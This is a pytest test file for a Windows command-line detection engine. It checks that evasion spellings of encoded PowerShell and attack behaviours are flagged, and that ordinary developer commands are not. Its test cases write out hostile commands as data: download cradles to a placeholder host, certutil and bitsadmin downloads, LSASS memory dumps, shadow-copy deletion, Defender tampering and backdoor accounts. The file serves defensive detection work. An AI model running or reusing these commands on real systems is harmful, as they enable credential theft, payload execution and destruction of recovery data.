"""Command-line detection: evasion variants must match, everyday commands must not."""

from __future__ import annotations

import pytest

from memguard.cmdline_rules import TAGS, match_cmdline, normalize_cmdline, score_tags

B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="  # harmless sample payload


# ── Encoded PowerShell: every spelling an attacker can choose ───────────────

@pytest.mark.parametrize("cmd", [
    f"powershell -enc {B64}",
    f"powershell -e {B64}",
    f"powershell -ec {B64}",
    f"powershell -EncodedCommand {B64}",
    f"powershell -encodedc {B64}",
    f"powershell /enc {B64}",
    f"POWERSHELL.EXE -EnC {B64}",
    f"pwsh -enc {B64}",
    f"pwsh.exe -nop -w hidden -e {B64}",
    rf"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE -EncodedCommand {B64}",
    f"cmd /c p^ower^shell -e {B64}",                  # cmd caret escapes
    f'cmd /c p"ower"shell -e {B64}',                  # quote splitting
    f"powershell \u2013enc {B64}",                     # en dash
    f"powershell \u2014EncodedCommand {B64}",          # em dash
    f"powershell   -nop    -e    {B64}",              # extra whitespace
])
def test_encoded_powershell_variants_are_detected(cmd):
    assert "encoded_powershell" in match_cmdline(cmd)


@pytest.mark.parametrize("cmd", [
    "powershell -ExecutionPolicy Bypass -File build.ps1",
    "powershell -ex bypass -nop -file x.ps1",
    "powershell -ep bypass",
    "powershell -e short",                            # argument too short to be a payload
    "notepad.exe -enc " + B64,                        # not PowerShell
])
def test_powershell_lookalikes_are_not_encoded(cmd):
    assert "encoded_powershell" not in match_cmdline(cmd)


# ── Everyday commands seen on a real developer workstation ───────────────────

@pytest.mark.parametrize("cmd", [
    r"C:\WINDOWS\system32\cmd.exe /d /s /c npx ^-y^ ^convex@latest^ ^mcp^ ^start^",
    r"C:\WINDOWS\system32\cmd.exe /d /s /c C:\Program^ Files\nodejs\npx.cmd ^-y^ ^@modelcontextprotocol/server-pdf^ ^--stdio^",
    r"C:\WINDOWS\system32\cmd.exe /d /s /c C:\Users\me\AppData\Local\Packages\Claude\chrome-native-host.exe "
    r"chrome-extension://fcoeoabgfenejglbffodgkkbkcdhcgfn/ --parent-window=0",
    "cmd.exe /c dir",
    "cmd /c echo hello",
    r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL",
    r"C:\Windows\system32\rundll32.exe C:\Windows\system32\shell32.dll,SHCreateLocalServerRunDll {9aa46009}",
    r"regsvr32 /s C:\Program Files\Vendor\plugin.dll",
    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --field-trial-handle=1',
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit -command try { . 'shellIntegration.ps1' } catch {}",
    "schtasks /query /fo LIST",
    "net user",
    "certutil -store my",
    "N/A",
    "",
])
def test_everyday_commands_are_not_flagged(cmd):
    assert match_cmdline(cmd) == []


# ── Behaviour coverage ───────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd, tag", [
    ("powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')", "powershell_download_cradle"),
    ("powershell IEX (New-Object Net.WebClient).('Down'+'loadString')('http://x')", "powershell_download_cradle"),
    ("powershell IEX (New-Object Net.WebClient).Down`loadString('http://x')", "powershell_download_cradle"),
    ("pwsh -c iwr -UseBasicParsing https://x/p.ps1 | iex", "powershell_download_cradle"),
    ("powershell [Convert]::FromBase64String($a)", "powershell_base64_decode"),
    ("tool.exe --mode base64", "base64_reference"),
    ("mshta http://x/payload.hta", "mshta_execution"),
    (r"C:\Windows\System32\mshta.exe vbscript:Execute(x)", "mshta_execution"),
    ("wscript.exe C:\\Users\\me\\invoice.vbs", "script_host_execution"),
    ("cscript //nologo run.js", "script_host_execution"),
    ("certutil -urlcache -split -f http://x/a.exe a.exe", "certutil_download"),
    ("certutil.exe /urlcache /f http://x/a a", "certutil_download"),
    ("certutil -decode in.txt out.exe", "certutil_decode"),
    ("bitsadmin /transfer job /download http://x/a C:\\a.exe", "bitsadmin_transfer"),
    ('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"', "rundll32_abuse"),
    (r"C:\Windows\System32\rundll32.exe", "rundll32_abuse"),
    (r"rundll32 C:\Users\me\AppData\Roaming\x.dll,Start", "rundll32_abuse"),
    (r"rundll32 \\10.0.0.5\share\x.dll,Run", "rundll32_abuse"),
    ("regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll", "regsvr32_scriptlet"),
    ("schtasks /create /sc minute /tn upd /tr C:\\x.exe", "scheduled_task_creation"),
    ("wmic process call create calc.exe", "wmic_execution"),
    ("wmic /node:10.0.0.5 process list", "wmic_execution"),
    (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\x.exe", "registry_run_key"),
    ("net user backdoor P@ss /add", "account_creation"),
    ("net localgroup administrators backdoor /add", "account_creation"),
    ("cmd /c c^m^d /c p^o^w^e^r^s^h^e^l^l", "command_obfuscation"),
    ("cmd /c %comspec:~-16,1%%comspec:~-1%", "command_obfuscation"),
    ("powershell I`E`X (G`e`T-Item x)", "command_obfuscation"),
    ("powershell I`E`X $payload", "command_obfuscation"),
    (r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full", "lsass_memory_dump"),
    ("rundll32 comsvcs.dll #24 624 out.dmp full", "lsass_memory_dump"),
    ("procdump64.exe -accepteula -ma lsass.exe out.dmp", "lsass_memory_dump"),
    ("vssadmin delete shadows /all /quiet", "inhibit_system_recovery"),
    ("wmic shadowcopy delete", "inhibit_system_recovery"),
    ("wbadmin delete catalog -quiet", "inhibit_system_recovery"),
    ("bcdedit /set {default} recoveryenabled No", "inhibit_system_recovery"),
    ("powershell Set-MpPreference -DisableRealtimeMonitoring $true", "defender_tampering"),
    ("powershell Add-MpPreference -ExclusionPath C:\\Users", "defender_tampering"),
    ("sc stop WinDefend", "defender_tampering"),
])
def test_behaviours_are_detected(cmd, tag):
    assert tag in match_cmdline(cmd)


def test_powershell_escape_sequences_are_not_obfuscation():
    # `n and `t are real PowerShell escapes used by ordinary scripts.
    assert "command_obfuscation" not in match_cmdline('powershell -c "a`nb`tc`nd`te"')


def test_every_tag_is_reachable_and_documented():
    for tag in TAGS.values():
        assert tag.weight in (20, 40)
        assert tag.technique_id.startswith("T")
        assert tag.summary and tag.summary.isascii()


def test_score_is_strongest_tag_not_sum():
    assert score_tags(["mshta_execution", "script_host_execution", "base64_reference"]) == 20
    assert score_tags(["mshta_execution", "lsass_memory_dump"]) == 40
    assert score_tags([]) == 0


def test_result_order_is_stable_and_unique():
    tags = match_cmdline(f"powershell -e {B64}; vssadmin delete shadows /all; powershell -e {B64}")
    assert tags == sorted(set(tags), key=list(TAGS).index)


@pytest.mark.parametrize("unit", [
    "certutil ", "certutil -u ", "bitsadmin ", "schtasks /c ", "wmic process call ", "vssadmin delete ",
    "bcdedit recoveryenabled ", "net user x ", "regsvr32 /i: ", "set-mppreference -disable ",
    "procdump -m ", "reg add \\currentversion\\ ", "%a:b=", "a^b^", "a`b`", "-a ",
])
def test_crafted_max_length_cmdline_cannot_stall_the_scan(unit):
    """Regression (stress test): 'certutil certutil ...' x 32,767 chars took 0.7 s
    per process with the old quadratic '.*' patterns. Must stay linear."""
    import time
    payload = ("powershell iwr " + unit * 33000)[:32767]
    start = time.perf_counter()
    match_cmdline(payload)
    assert time.perf_counter() - start < 0.15


def test_sequence_rules_keep_their_meaning():
    # head must come BEFORE tail, exactly like the old "head.*tail" regex
    assert "scheduled_task_creation" in match_cmdline("schtasks /query & schtasks /create /tn x")
    assert "scheduled_task_creation" not in match_cmdline("/create something then schtasks /query")
    assert "inhibit_system_recovery" in match_cmdline("cmd /c vssadmin list shadows && vssadmin delete shadows /all")


def test_normalize_cmdline():
    assert normalize_cmdline('P^ow"er"Sh`ell  \u2013Enc') == "powershell -enc"
    assert normalize_cmdline("") == ""
